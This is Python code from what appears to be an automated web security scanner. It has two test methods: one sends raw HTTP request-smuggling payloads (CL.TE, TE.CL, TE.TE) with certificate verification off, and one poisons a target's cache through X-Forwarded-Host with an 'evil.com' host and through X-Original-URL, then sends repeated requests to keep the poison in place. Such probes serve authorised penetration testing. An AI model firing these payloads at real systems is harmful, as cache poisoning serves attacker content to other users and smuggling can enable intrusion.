    def test_w11_http_smuggling_deep_v2(self):
        """W11 #29 — HTTP Smuggling Deep v2."""
        if not self.deep: return
        self._print("[*]", "W11: HTTP Smuggling Deep v2...", "INFO")
        # Test CL.TE, TE.CL via socket
        import socket, ssl
        hostname = urlparse(self.target).hostname
        port = urlparse(self.target).port or (443 if urlparse(self.target).scheme == "https" else 80)
        payloads = [
            (b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED", "CL.TE"),
            (b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n", "TE.CL"),
            (b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\nSMUGGLED", "TE.TE"),
        ]
        for payload, label in payloads:
            try:
                sock = socket.create_connection((hostname, port), timeout=5)
                if urlparse(self.target).scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=hostname)
                sock.send(payload)
                data = sock.recv(8192)
                sock.close()
                if b"SMUGGLED" in data:
                    self._add_vuln(f"W11 HTTP Smuggling: {label}",
                                    "CRITICAL", self.target,
                                    f"HTTP smuggling via {label}",
                                    label=label)
            except Exception: pass

    def test_w11_cache_poisoning_deep_v2(self):
        """W11 #30 — Cache Poisoning Deep v2."""
        if not self.deep: return
        self._print("[*]", "W11: Cache Poisoning Deep v2...", "INFO")
        import time
        evil_host = f"CACHE_{int(time.time())}.evil.com"
        # Poison via X-Forwarded-Host
        r1 = self._get(self.target, headers={"X-Forwarded-Host": evil_host})
        # Rapid requests to freeze cache
        for _ in range(20):
            self._get(self.target)
        # Check if poisoned
        r2 = self._get(self.target)
        if r2 and evil_host in (r2.text or ""):
            self._add_vuln("W11 Cache Poisoning via X-Forwarded-Host",
                            "CRITICAL", self.target,
                            f"Cache poisoned and frozen — {evil_host}",
                            evil_host=evil_host)
        # Poison via X-Original-URL
        r3 = self._get(self.target, headers={"X-Original-URL": "/admin"})
        for _ in range(10):
            self._get(self.target)
        r4 = self._get(self.target)
        if r4 and "/admin" in (r4.text or "") and "admin" in (r4.text or "").lower():
            self._add_vuln("W11 Cache Poisoning via X-Original-URL",
                            "HIGH", self.target,
                            "Cache poisoned via X-Original-URL")

